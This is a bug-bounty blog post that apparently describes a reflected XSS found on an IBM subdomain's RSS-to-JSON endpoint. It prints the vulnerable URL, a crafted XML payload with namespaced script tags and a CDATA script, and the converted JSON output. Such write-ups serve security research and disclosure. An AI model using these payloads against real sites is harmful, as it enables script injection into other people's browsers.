<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D}</style><title>[IBM] XSS Reflected via xml files</title><meta name=description content="simple writeup about XSS Reflected on ibm subdomain"><meta name=keywords content="blog,knassar702,pentesting,bugbounty,Security Automation,sectools,Rust,Python,DevSecOps,Khaled Nassar,security,webpentesting"><meta property="og:url" content="https://www.knas.me/posts/ibm_xss/"><meta property="og:type" content="website"><meta property="og:title" content=" [IBM] XSS Reflected via xml files"><meta property="og:description" content="simple writeup about XSS Reflected on ibm subdomain"><meta property="og:image" content="/images/avatar.jpg"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content=" [IBM] XSS Reflected via xml files"><meta name=twitter:description content="simple writeup about XSS Reflected on ibm subdomain"><meta property="twitter:domain" content="https://www.knas.me/posts/ibm_xss/"><meta property="twitter:url" content="https://www.knas.me/posts/ibm_xss/"><meta name=twitter:image content="/images/avatar.jpg"><link rel=canonical href=https://www.knas.me/posts/ibm_xss/><link rel=stylesheet type=text/css href=https://www.knas.me//css/normalize.min.css media=print onload='this.media="all"'><link rel=stylesheet type=text/css href=https://www.knas.me//css/main.css><link disabled id=dark-theme rel=stylesheet href=https://www.knas.me//css/dark.css><script src=https://www.knas.me//js/svg-injector.min.js></script>
<script src=https://www.knas.me//js/feather-icons.min.js></script>
<script src=https://www.knas.me//js/main.js></script>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css integrity=sha384-Xi8rHCmBmhbuyyhbI88391ZKP2dmfnOl4rT9ZfRI7mLTdk1wblIUnrIq35nqwEvC crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js integrity=sha384-X/XCfMm41VSsqRNQgDerQczD69XqmjOOOwYQvr/uuC+j4OPoNhVgjdGFwhvN02Ja crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}],throwOnError:!1})})</script></head><body><script type=text/javascript>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://www.knas.me/><img src=https://www.knas.me//images/avatar.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://www.knas.me/>Khaled Nassar</a></div><div class=nav-links><div class=nav-link><a href=https://www.knas.me/><span data-feather=home></span> Home</a></div><div class=nav-link><a href=https://www.knas.me/posts/><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://www.knas.me/projects/><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://www.knas.me/tags/><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://github.com/526avijitgupta/gokarna><span data-feather=github></span></a></div><div class=nav-link><a href=https://www.buymeacoffee.com/knassar702><span data-feather=coffee></span></a></div><div class=nav-link><a href=https://www.knas.me/index.xml><span data-feather=rss></span></a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span id=dark-theme-toggle-screen-reader-target class=sr-only></span>
<a><span id=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span id=hamburger-menu-toggle-screen-reader-target class=sr-only>menu</span>
<a><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://www.knas.me/><span data-feather=home></span> Home</a></li><li class=nav-item><a href=https://www.knas.me/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://www.knas.me/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://www.knas.me/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://github.com/526avijitgupta/gokarna><span data-feather=github></span></a></li><li class=nav-item><a href=https://www.buymeacoffee.com/knassar702><span data-feather=coffee></span></a></li><li class=nav-item><a href=https://www.knas.me/index.xml><span data-feather=rss></span></a></li><li class="nav-item dark-theme-toggle"><span id=dark-theme-toggle-screen-reader-target class=sr-only>theme</span>
<a><span id=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>[IBM] XSS Reflected via xml files</h1><small role=doc-subtitle>simple writeup about XSS Reflected on ibm subdomain</small><p class=post-date>October 26, 2020</p><ul class=post-tags><li class=post-tag><a href=https://www.knas.me/tags/bugbounty>bugbounty</a></li><li class=post-tag><a href=https://www.knas.me/tags/security>security</a></li><li class=post-tag><a href=https://www.knas.me/tags/webpentesting>webpentesting</a></li></ul></div><div class=post-content><p><p>Hello World 👋
while I&rsquo;m doing some bug hunting on IBM subdomains I decided instead of using subdomain enumeration I can get interesting endpoints and parameters from <code>waybackurls</code> to shorten the time, after reading the URLs from waybackurls I noticed a lot of endpoints that contain some URLs of XML files in <code>rssurl</code> parameter</p><pre tabindex=0><code>https://www-356.ibm.com/partnerworld/wps/servlet/pwdyn/pw/rss/rsstojson.jsp?ccdb=no&amp;rssurl=https://www-2000.ibm.com/file.xml&amp;_=1596170198353
</code></pre><p><img src=https://1.bp.blogspot.com/-7Dz0qMUTtE0/X5bYy8O2QfI/AAAAAAAAEYw/gioHZXy_lps0DyITLNrJhQFlaCXmV-GHwCLcBGAsYHQ/s1600/Screenshot_at_2020-08-09_18-52-24.png alt=ibm_xml></p><p>all this API endpoint do is read the XML from the URL and then return its value of it but in JSON, for the first time I thought there was an SSRF but after a lot of trying to bypass it, it doesn&rsquo;t work at all</p><p><img src=https://media.tenor.com/RTdXxzgoQewAAAAC/chihuahua-basal.gif alt=noway></p><p>but from another side, I noticed that the response <code>Content-type</code> is <code>text/HTML</code> so I think I can do an xss here, the idea is I can make an XML file that contains the xss payload in one of the variables so after converting it to JSON it will be reflected in the page as an HTML code, like this <code>{"data": "&lt;script>alert(123)&lt;/script>"}</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-XML data-lang=XML><span style=display:flex><span><span style=color:#f92672>&lt;html&gt;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>&lt;head&gt;&lt;/head&gt;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>&lt;body&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#f92672>&lt;something:script</span> <span style=color:#a6e22e>xmlns:something=</span><span style=color:#e6db74>&#34;http://www.w3.org/1999/xhtml&#34;</span><span style=color:#f92672>&gt;</span>alert(1)<span style=color:#f92672>&lt;/something:script&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#f92672>&lt;a:script</span> <span style=color:#a6e22e>xmlns:a=</span><span style=color:#e6db74>&#34;http://www.w3.org/1999/xhtml&#34;</span><span style=color:#f92672>&gt;</span>alert(2)<span style=color:#f92672>&lt;/a:script&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#f92672>&lt;info&gt;</span>
</span></span><span style=display:flex><span>		  <span style=color:#f92672>&lt;name&gt;</span>
</span></span><span style=display:flex><span>		    <span style=color:#f92672>&lt;value&gt;</span><span style=color:#75715e>&lt;![CDATA[&lt;script&gt;confirm(document.domain)&lt;/script&gt;]]&gt;</span><span style=color:#f92672>&lt;/value&gt;</span>
</span></span><span style=display:flex><span>		  <span style=color:#f92672>&lt;/name&gt;</span>
</span></span><span style=display:flex><span>		    <span style=color:#f92672>&lt;description&gt;</span>
</span></span><span style=display:flex><span>		      <span style=color:#f92672>&lt;value&gt;</span>Hello<span style=color:#f92672>&lt;/value&gt;</span>
</span></span><span style=display:flex><span>		    <span style=color:#f92672>&lt;/description&gt;</span>
</span></span><span style=display:flex><span>		    <span style=color:#f92672>&lt;url&gt;</span>
</span></span><span style=display:flex><span>		      <span style=color:#f92672>&lt;value&gt;</span>http://google.com<span style=color:#f92672>&lt;/value&gt;</span>
</span></span><span style=display:flex><span>		    <span style=color:#f92672>&lt;/url&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#f92672>&lt;/info&gt;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>&lt;/body&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/html&gt;</span>
</span></span></code></pre></div><p>then upload the file to my site and pass the URL to the rssurl parameter</p><p>the file should be converted like this</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-JSON data-lang=JSON><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;html&#34;</span>: {
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;head&#34;</span>: <span style=color:#e6db74>&#34;&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;body&#34;</span>: {
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;script&#34;</span>: [
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;alert(1)&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;alert(2)&#34;</span>
</span></span><span style=display:flex><span>      ],
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;info&#34;</span>: {
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;name&#34;</span>: {
</span></span><span style=display:flex><span>          <span style=color:#f92672>&#34;value&#34;</span>: {
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;__cdata&#34;</span>: <span style=color:#e6db74>&#34;&lt;script&gt;confirm(document.domain)&lt;/script&gt;&#34;</span>
</span></span><span style=display:flex><span>          }
</span></span><span style=display:flex><span>        },
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;description&#34;</span>: {
</span></span><span style=display:flex><span>          <span style=color:#f92672>&#34;value&#34;</span>: <span style=color:#e6db74>&#34;Hello&#34;</span>
</span></span><span style=display:flex><span>        },
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;url&#34;</span>: {
</span></span><span style=display:flex><span>          <span style=color:#f92672>&#34;value&#34;</span>: <span style=color:#e6db74>&#34;http://google.com&#34;</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>and boom</p><p><img src=https://1.bp.blogspot.com/-BHQh_JQb0Uc/X5bZv80_nnI/AAAAAAAAEY8/hn-Ok2MGjcca4ixkIZpeUgQ1kqCYH5OvwCLcBGAsYHQ/s1600/Screenshot_at_2020-08-09_18-54-51.png alt=xss_boom></p><p>see ya 🤞 ❤️</p></p></div></div><aside class=post-toc><nav id=toc><nav id=TableOfContents></nav></nav></aside></main><footer class=footer><span>&copy; 2022 The Marauders</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/526avijitgupta/gokarna>Gokarna</a></span></footer></body></html>